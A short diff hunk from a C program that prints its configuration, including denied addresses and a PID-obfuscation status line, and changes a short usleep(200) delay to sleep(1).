@@ -400,7 +400,7 @@ int main(int argc, char **argv) {
     boopprintf("  XX Deny address            : %s\n", cfg.deny[i]);
   }
   boopprintf("  -> Obfuscating PID         : %s\n", pid);
-  usleep(200);
+  sleep(1);
   boopprintf(
       "================================================================\n");
 
